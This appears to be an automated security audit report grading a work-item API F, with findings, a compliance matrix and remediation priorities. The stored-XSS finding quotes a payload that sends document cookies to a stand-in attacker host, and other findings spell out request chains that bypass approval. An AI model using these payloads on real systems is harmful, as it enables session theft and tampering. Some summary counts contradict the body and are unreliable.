# TheGuardians — Security & Compliance Report

**Date:** 2026-10-12  
**Grade:** F  
**Run scope:** dev-crew Source App (Source/Backend) + portal/Backend (live target)  
**Frameworks:** OWASP-ASVS L2 · SOC2-Type2 CC6.1/6.2/6.3/7.1/8.1  

---

## Executive Summary

**The application fails every security objective.** The red-team confirmed all four pentest objectives as live exploits against the running environment, triggering an automatic **Grade F**.

The root cause is unambiguous: **the entire API — every endpoint, every action — is completely unauthenticated and unauthorized.** There is no JWT, no session, no API key, no role check anywhere in the request pipeline. Any actor who can reach port 3001 can create, read, update, delete, approve, reject, dispatch, or bulk-destroy data with zero credentials.

On top of this root failure, the state machine that governs work item / feature-request approval is doubly bypassed: (1) a `force-approve` endpoint requires no auth and no minimum voting round, and (2) the `status` field is directly writable via `PATCH`, allowing clients to skip the normal state transitions entirely. Both were confirmed live against the running portal/Backend.

**Top 3 Risks:**
1. **No authentication anywhere** — anonymous actors control the entire system (C-001, confirmed live)
2. **State machine bypass** — approve any item, skip AI voting, force any status transition (C-002, confirmed live)
3. **Unauthenticated bulk deletion** — enumerate and permanently destroy all records with no recovery path (C-003, confirmed live)

**Compliance pass rate: ~17%** (2 of 12 controls partial-pass; 0 fully pass). The minimum for Grade C is 60%.

---

## Consolidated Findings

### CRITICAL — Confirmed Live Exploits

---

#### C-001 · No Authentication or Authorization on Entire API
**Severity:** Critical · **Status:** Confirmed (Live Exploit)  
**Sources:** PEN-001, RED-001, SAST-001, COMP-001, COMP-004  
**Specialists:** static-analyzer · pen-tester · red-teamer · compliance-auditor

The Express application has zero authentication middleware. Every endpoint — CRUD, state transitions (approve, reject, dispatch), intake webhooks, dashboard, metrics — is fully accessible to any unauthenticated caller. Red-team confirmed: `GET /api/feature-requests`, `POST /api/feature-requests`, `DELETE /api/feature-requests/FR-0001` all returned HTTP 200/201/204 with no Authorization header. Verified across 8 route namespaces.

**Remediation:**
- Add global JWT authentication middleware (e.g., `express-jwt`) before all route handlers in `Source/Backend/src/app.ts`
- Implement a login endpoint that issues signed tokens
- Add RBAC with `requireRole()` middleware per route (reader / reviewer / approver / dispatcher)
- Derive actor identity from the token in every mutating operation

---

#### C-002 · State Machine Bypass — Multiple Paths to Approve Without Assessment
**Severity:** Critical · **Status:** Confirmed (Live Exploit)  
**Sources:** PEN-002, PEN-003, RED-002, RED-007  
**Specialists:** pen-tester · red-teamer

Two independent bypass chains were confirmed live:

**Chain A (PATCH shortcut):** `PATCH /api/feature-requests/:id` accepts `{"status":"voting"}` directly, skipping the `/vote` endpoint that triggers AI agent voting. Then `POST /force-approve` (no auth) transitions to `approved` with 0 AI votes ever cast.

**Chain B (fast-track override):** `POST /api/work-items/:id/route` with `{"overrideRoute":"fast-track"}` forces `classifyRoute()` to return `Approved` regardless of item type or complexity, bypassing assessment entirely.

Red-team evidence: FR-0005 reached `status=approved, votes=[]` after two unauthenticated requests.

**Remediation:**
- Remove `status` from PATCH-able fields entirely — status transitions must go through dedicated endpoints with state machine enforcement
- Gate `force-approve` behind admin/manager role; require at least one completed voting round as precondition
- Gate `overrideRoute` on a privilege-level check; reject the field entirely for non-admin callers
- Add invariant tests: no item may reach `approved` without a `changeHistory` entry from the assessment pod

---

#### C-003 · Unauthenticated Bulk Data Deletion (Permanent, No Recovery)
**Severity:** Critical · **Status:** Confirmed (Live Exploit)  
**Sources:** RED-008, PEN-001  
**Specialists:** red-teamer · pen-tester

`DELETE /api/feature-requests/:id` and `DELETE /api/bugs/:id` require no authentication and perform a hard delete. Red-team confirmed FR-0001 permanently destroyed in one unauthenticated request. An attacker can enumerate sequential IDs (`FR-0001`, `FR-0002`, …) and issue bulk deletions to wipe all data, with no soft-delete buffer and no audit trail.

**Remediation:**
- Require authentication on all DELETE operations (blocked by C-001 fix)
- Implement soft-delete: add `deleted_at` column; filter deleted items in queries
- Add a privileged hard-purge endpoint for GDPR compliance (blocked behind admin role)
- Add rate limiting on DELETE routes

---

### HIGH — Confirmed Live Exploits

---

#### H-001 · Ghost-Blocker DoS — Deleted Blocker Permanently Freezes Dependent Item
**Severity:** High · **Status:** Confirmed (Live Exploit)  
**Sources:** PEN-006, RED-003  
**Specialists:** pen-tester · red-teamer

When a blocker item is deleted, dependent items' `blockedBy` arrays are not cleaned up. `computeHasUnresolvedBlockers()` returns `true` for deleted (unfound) blockers — treating a ghost reference identically to an active blocker. Red-team confirmed: FR-0009 permanently frozen with `blocked_by: [{"item_id":"FR-0008","title":"Unknown","status":"unknown"}]` after FR-0008 was deleted. No API endpoint can clear this ghost reference.

**Remediation:**
- On item deletion, cascade-remove all dependency edges where the item appears as a blocker
- Fix `computeHasUnresolvedBlockers()`: treat `blocker === undefined` as resolved (or warn and skip), not as blocking
- Add a periodic dependency audit job that cleans up orphaned blocker references

---

#### H-002 · No Pagination Enforcement — Full Dataset Extraction in Single Request
**Severity:** High · **Status:** Confirmed (Live Exploit)  
**Sources:** PEN-004, RED-004, SAST-005, COMP-006  
**Specialists:** pen-tester · red-teamer · static-analyzer · compliance-auditor

`GET /api/work-items` parses `limit` with no maximum cap (Source/Backend). In portal/Backend, `listFeatureRequests()` runs raw `SELECT * FROM feature_requests` with no LIMIT clause — no pagination contract exists at all. Red-team confirmed 9 items returned in a single unauthenticated request from the live instance. For large datasets this enables full data exfiltration and server resource exhaustion.

**Remediation:**
- Source/Backend: clamp limit — `const limit = Math.min(Math.max(1, parseInt(...) || 20), 100)`
- portal/Backend: add `LIMIT` / `OFFSET` to all SQL list queries; add `limit`/`page` query parameters and validate them
- Return `{data, total, page, limit, totalPages}` for all list endpoints (per CLAUDE.md API patterns)

---

#### H-003 · Stored XSS — HTML/Script Payloads Stored Verbatim
**Severity:** High · **Status:** Confirmed (Live Exploit)  
**Sources:** RED-006, PEN-012  
**Specialists:** red-teamer · pen-tester

`POST /api/bugs` and `POST /api/feature-requests` accept free-text `title` and `description` fields with no HTML sanitization. Red-team stored `<script>alert(1)</script>` and `<img src=x onerror="fetch('http://evil.com/'+document.cookie)">` verbatim (BUG-0002, BUG-0004). Both payloads appear in `GET /api/bugs` listings unescaped. Any frontend rendering these without explicit HTML encoding will execute the JS.

**Remediation:**
- Server-side: sanitize all free-text inputs using `isomorphic-dompurify` or enforce a strict character allowlist on `title`/`description`/`reason` fields
- Frontend: always HTML-encode dynamic content before DOM insertion; use framework escaping (React escapes by default — verify no `dangerouslySetInnerHTML` usage)
- Add a Content-Security-Policy header via `helmet()` to limit XSS impact

---

### HIGH — Theoretical (Not Red-Team Confirmed)

---

#### H-004 · Unauthenticated Bulk Dependency Replacement via PATCH
**Severity:** High · **Status:** Theoretical  
**Sources:** PEN-007  
**Specialists:** pen-tester

`PATCH /api/work-items/:id` accepts `blockedBy: []` and atomically replaces all existing dependencies, enabling any unauthenticated actor to silently clear all blockers from an approved item and force it through dispatch.

**Remediation:** Require authentication; gate dependency modification behind reviewer/dispatcher role; separate the `blockedBy` mutation into a dedicated, audited endpoint.

---

#### H-005 · Cascade Dispatch Exploit — Force Auto-Dispatch via Reject-After-Approve
**Severity:** High · **Status:** Theoretical  
**Sources:** PEN-009  
**Specialists:** pen-tester

Rejecting a blocker triggers `onItemResolved()` which auto-dispatches dependent items in `approved` status. Combined with PEN-002/003 (unauthenticated approve), an attacker can engineer a four-step chain to dispatch any item without touching the `/dispatch` endpoint, bypassing its team-name validation.

**Remediation:** `onItemResolved()` cascade dispatch should validate team name and require the same authorization checks as the explicit `/dispatch` endpoint.

---

#### H-006 · Unauthenticated Intake Webhooks — No HMAC Verification
**Severity:** High · **Status:** Theoretical  
**Sources:** SAST-002, COMP-005  
**Specialists:** static-analyzer · compliance-auditor

`POST /api/intake/zendesk` and `POST /api/intake/automated` accept arbitrary JSON with no signature verification. Any actor who knows the URL can inject unlimited fabricated work items into the workflow engine, or inject malicious payloads into `title`/`description` fields.

**Remediation:** Verify `X-Zendesk-Webhook-Signature` HMAC-SHA256 against a shared secret in an env var. Add `Authorization: Bearer <INTAKE_API_KEY>` check to `/automated`. Reject non-matching requests with 401.

---

#### H-007 · Required SOC2 Audit Events Not Emitted
**Severity:** High · **Status:** Theoretical  
**Sources:** COMP-002  
**Specialists:** compliance-auditor

All four `security.config.yml` required audit events are missing: `login_attempt` (no auth layer), `permission_denied` (no authz), `state_transition` (present but uses hardcoded actor strings — not a real user identity), `data_export` (no log event defined). SOC2 CC7.1 requires actor-attributable audit trails.

**Remediation:** Create a dedicated `auditLog({event, actor, target, timestamp, outcome, ip})` function. Wire it to: auth endpoint (login_attempt), auth middleware (permission_denied), workflow action handlers (state_transition with real actor from token), and bulk-read/export paths (data_export).

---

#### H-008 · No TLS/HTTPS Enforcement
**Severity:** High · **Status:** Theoretical  
**Sources:** COMP-003  
**Specialists:** compliance-auditor

The application binds to a plain HTTP listener. No TLS termination, HTTP→HTTPS redirect, or HSTS header is configured in source. All data travels unencrypted. No `helmet` is installed.

**Remediation:** Install `helmet` and add `app.use(helmet())`. Document in CLAUDE.md that TLS termination is handled at infra layer. Add middleware that rejects requests where `X-Forwarded-Proto !== 'https'` in production. Add integration test confirming `Strict-Transport-Security` header is present.

---

### MEDIUM

---

#### M-001 · Prometheus /metrics Publicly Accessible
**Severity:** Medium · **Status:** Confirmed (Live Exploit)  
**Sources:** PEN-008, RED-005, SAST-006  
**Specialists:** pen-tester · red-teamer · static-analyzer

`GET /metrics` (and `GET http://localhost:3001/metrics` on portal) returns full Prometheus exposition — per-route request counts, latency histograms with route labels, and heap metrics — with no auth. Red-team confirmed: reveals active API routes, HTTP status distribution, and operational timing patterns.

**Remediation:** Restrict to internal network via reverse proxy, or add a bearer token check (`METRICS_TOKEN` env var), or expose on a separate non-public port.

---

#### M-002 · Internal Error Messages Leaked to API Clients
**Severity:** Medium · **Status:** Theoretical  
**Sources:** SAST-003  
**Specialists:** static-analyzer

Every catch block in `workflow.ts` serializes `err.message` directly into the HTTP 500 response. This can expose internal state, data model details, and service names. The `errorHandler.ts` pattern (correct: returns generic message, logs full context) is not followed by route handlers.

**Remediation:** Replace `res.status(500).json({ error: message })` with `res.status(500).json({ error: 'Internal server error' })` in all catch blocks. Log full error context via logger only.

---

#### M-003 · Intake Webhook Enum Validation Bypass
**Severity:** Medium · **Status:** Theoretical  
**Sources:** SAST-004, PEN-005  
**Specialists:** static-analyzer · pen-tester

Intake routes use `body.type || WorkItemType.Bug` fallback — any truthy but invalid string (e.g., `type: "__proto__"`) bypasses the default and is stored verbatim. The main `POST /api/work-items` route correctly validates enums; intake paths do not.

**Remediation:** Add enum validation in both intake routes before `createWorkItem()`, mirroring the pattern in `workItems.ts` lines 29–41.

---

#### M-004 · No CORS Policy / Missing Security Headers
**Severity:** Medium · **Status:** Theoretical (partial mitigation confirmed by red-team)  
**Sources:** PEN-010, SAST-007  
**Specialists:** pen-tester · static-analyzer

No `helmet`, no explicit CORS policy. No CSP, X-Frame-Options, X-Content-Type-Options, or HSTS headers. Red-team noted CORS properly rejects cross-origin browser requests from non-whitelisted origins on the portal instance — but this is browser-level protection only, not a server-side enforcement. Non-browser API callers are unaffected.

**Remediation:** `npm install helmet cors` and add `app.use(helmet()); app.use(cors({ origin: 'http://localhost:5173' }));` before route registration.

---

#### M-005 · Sequential Predictable Document IDs Enable Enumeration
**Severity:** Medium · **Status:** Theoretical  
**Sources:** PEN-011  
**Specialists:** pen-tester

`generateDocId()` produces sequential `WI-001`, `WI-002`, etc. from a server-side counter. The counter is monotonically increasing and never resets, revealing total historical item count including deleted items. `docId` values appear in change history notes, revealing internal operational relationships.

**Remediation:** Use random suffixes (e.g., short UUID segment) for `docId` generation, or accept the information-disclosure risk and document it.

---

#### M-006 · NaN/Negative Pagination — Response Oracle
**Severity:** Medium · **Status:** Theoretical  
**Sources:** PEN-013, SAST-008  
**Specialists:** pen-tester · static-analyzer

`page=abc` → `NaN` → `slice(NaN, NaN)` = `[]` — returns empty data but non-zero `total`, confirming item count without viewing data. `page=-1` returns items from the end of the sorted array. `limit=0` returns `totalPages: Infinity`.

**Remediation:** Add `isNaN` guard and range check: `const page = isNaN(rawPage) || rawPage < 1 ? 1 : rawPage`; `const limit = Math.min(Math.max(1, rawLimit || 20), 100)`.

---

#### M-007 · No Actor Identity in Operational Logs or Change History
**Severity:** Medium · **Status:** Theoretical  
**Sources:** COMP-007  
**Specialists:** compliance-auditor

Change history entries use hardcoded strings (`'manual-override'`, `'dispatcher'`, `'user'`, `'system'`). Operational logs never include `userId`, `userEmail`, or `requestId`. The audit trail cannot answer "who did what."

**Remediation:** Thread real actor identity from the auth token (once C-001 is fixed) through all service calls. Add request ID middleware (via `AsyncLocalStorage`) injected into all log calls. Replace hardcoded actor strings in `buildChangeEntry` with the authenticated user ID.

---

#### M-008 · No Hard Delete / Right to Erasure Mechanism
**Severity:** Medium · **Status:** Theoretical  
**Sources:** COMP-008  
**Specialists:** compliance-auditor

`DELETE /api/work-items/:id` performs only a soft delete. Items remain in the in-memory store indefinitely. No hard-delete endpoint, no purge mechanism, no retention policy. `title`/`description` fields may contain user-entered PII in practice.

**Remediation:** Implement `purgeWorkItem(id)` removing the item from the Map entirely. Expose as a privileged admin endpoint (behind RBAC). Document retention policy (e.g., soft-deleted items purged after 30 days).

---

#### M-009 · No Rate Limiting on Any Endpoint
**Severity:** Medium · **Status:** Theoretical  
**Sources:** COMP-009  
**Specialists:** compliance-auditor

No rate-limiting middleware on any route. Intake and workflow action endpoints are particularly exposed to flooding.

**Remediation:** Install `express-rate-limit`. Apply global limiter (100 req/min per IP) and tighter limiter on intake and state-transition endpoints (10 req/min per IP).

---

### LOW

---

#### L-001 · No Length Validation on Free-Text Fields
**Severity:** Low · **Status:** Confirmed (via RED-006 extension)  
**Sources:** PEN-012  
**Specialists:** pen-tester · red-teamer

`title`, `description`, and `reason` fields have no per-field length limit. Express's 100KB body limit partially mitigates this but doesn't prevent memory pressure from large descriptions in change history aggregation.

**Remediation:** Add `maxLength` validation (e.g., `title ≤ 200`, `description ≤ 10,000` chars) in all creation and update routes.

---

#### L-002 · No Correlation/Trace IDs in Log Entries
**Severity:** Low · **Status:** Theoretical  
**Sources:** COMP-010  
**Specialists:** compliance-auditor

CLAUDE.md mandates OpenTelemetry tracing with W3C `traceparent` propagation, but the logger emits no `traceId`, `spanId`, or `requestId`. Log entries cannot be correlated across a request's lifecycle.

**Remediation:** Integrate `@opentelemetry/sdk-node` or `pino` serializers. Add request middleware that extracts/generates `traceparent` and injects `traceId`/`spanId` into all log entries via `AsyncLocalStorage`.

---

## Compliance Matrix

| Framework | Control | Description | Status |
|---|---|---|---|
| OWASP-ASVS L2 | V2 (Auth) | Authentication required before access | ❌ FAIL |
| OWASP-ASVS L2 | V3 (Session Mgmt) | Session timeouts / secure tokens | ❌ FAIL |
| OWASP-ASVS L2 | V4 (Access Control) | Role-based authorization on all routes | ❌ FAIL |
| OWASP-ASVS L2 | V5 (Input Validation) | Pagination limit capped; enum validation | ⚠️ PARTIAL |
| OWASP-ASVS L2 | V6 (Cryptography) | Sensitive data encrypted at rest | ⚠️ PARTIAL* |
| OWASP-ASVS L2 | V7 (Logging) | Sufficient structured logging | ⚠️ PARTIAL |
| OWASP-ASVS L2 | V9 (Communications) | TLS enforced for all traffic | ❌ FAIL |
| SOC2-Type2 | CC6.1 | Logical access controls implemented | ❌ FAIL |
| SOC2-Type2 | CC6.2 | User registration & access authorization | ❌ FAIL |
| SOC2-Type2 | CC6.3 | Access revocation & removal process | ❌ FAIL |
| SOC2-Type2 | CC7.1 | System monitoring & audit events | ⚠️ PARTIAL |
| SOC2-Type2 | CC8.1 | Change management audit trail | ⚠️ PARTIAL |

> *V6 partial: current WorkItem schema contains no fields matching `sensitive_fields` — no at-rest encryption gap for current data model. Gap exists if PII enters title/description or a database is added.

**Pass rate: ~17%** (2 partial-pass, 0 fully passing, 10 fail) — threshold for Grade C is 60%.

---

## Red Team Summary

| Objective | Result | Chain |
|---|---|---|
| Bypass work item state machine to reach an invalid status | ✅ ACHIEVED | RED-002: PATCH→voting→force-approve with 0 AI votes |
| Access or modify a soft-deleted work item via direct ID reference | ✅ ACHIEVED | RED-003: Ghost-blocker survives delete, permanently blocks dependent |
| Submit a malformed assessment verdict that bypasses routing logic | ✅ ACHIEVED | RED-007: force-approve with no auth overrides any vote outcome |
| Enumerate all work items without pagination limit enforcement | ✅ ACHIEVED | RED-004: No LIMIT in SQL, full dataset in one unauthenticated request |

**Objectives achieved: 4 / 4**  
**Confirmed breaches: 8** (RED-001 through RED-008)  
**Automatic Grade F** — confirmed breach of critical objectives.

**What held:**
- Bug PATCH status transitions enforce the state machine (400 for invalid jumps) in some cases
- CORS properly rejects cross-origin browser requests from non-whitelisted origins on portal instance
- Orchestrator proxy unavailable in test environment (no SSRF surface confirmed)

**Key Discovery:** The pen-tester's attack surface map targeted `Source/Backend` (`/api/work-items`); the live docker-compose target runs `portal/Backend` (`/api/feature-requests`, `/api/bugs`, etc.). The structural vulnerability classes — no auth, state machine bypass, ghost blocker, no pagination — are present in **both** codebases.

---

## Findings Count

| Severity | Confirmed | Theoretical | Total |
|---|---|---|---|
| Critical | 3 | 0 | **3** |
| High | 3 | 5 | **8** |
| Medium | 1 | 8 | **9** |
| Low | 0 | 2 | **2** |
| **Total** | **7** | **15** | **22** |

**Grade: F** — confirmed red-team breach of critical objectives (automatic per grading config)

---

## Remediation Priority Order

| Priority | Finding | Effort | Unblocks |
|---|---|---|---|
| P0 (immediate) | C-001 — Add JWT auth middleware globally | Medium | All other auth/authz controls |
| P0 (immediate) | C-002 — Remove status from PATCH; gate force-approve behind admin role | Low | State machine integrity |
| P0 (immediate) | C-003 — Add auth on DELETE; implement soft-delete | Low | Data integrity |
| P1 | H-001 — Cascade cleanup on item deletion | Low | Ghost-blocker DoS |
| P1 | H-002 — Cap pagination limit + add SQL LIMIT | Very Low | Data enumeration + DoS |
| P1 | H-003 — Sanitize free-text inputs server-side | Low | Stored XSS |
| P1 | H-006 — Webhook HMAC signature verification | Low | Intake injection |
| P1 | H-007 — Emit required audit events | Medium | SOC2 CC7.1 |
| P2 | C-001 follow-up — Add RBAC (requireRole middleware) | Medium | Authz; H-004, H-005 |
| P2 | H-008 — Add helmet + document TLS at infra | Low | TLS/headers |
| P2 | M-009 — Rate limiting with express-rate-limit | Low | DoS prevention |
| P3 | M-001 — Restrict /metrics endpoint | Very Low | Info leak |
| P3 | M-002 — Sanitize error messages to clients | Very Low | Info leak |
| P3 | M-006 — Pagination parameter guards | Very Low | Response oracle |
| P4 | M-007 — Thread actor identity through logs | Medium | Audit trail |
| P4 | M-008 — Hard-delete/purge endpoint | Low | GDPR Art. 17 |
| P4 | L-001 — Field length validation | Very Low | Memory pressure |
| P4 | L-002 — OpenTelemetry trace IDs in logs | Medium | Observability |

---

*Report generated by TheGuardians · team_leader · 2026-10-12*  
*Full artifacts: `Teams/TheGuardians/findings/security-report-2026-10-12-F.html` · `Teams/TheGuardians/findings/security-backlog-2026-10-12.json`*
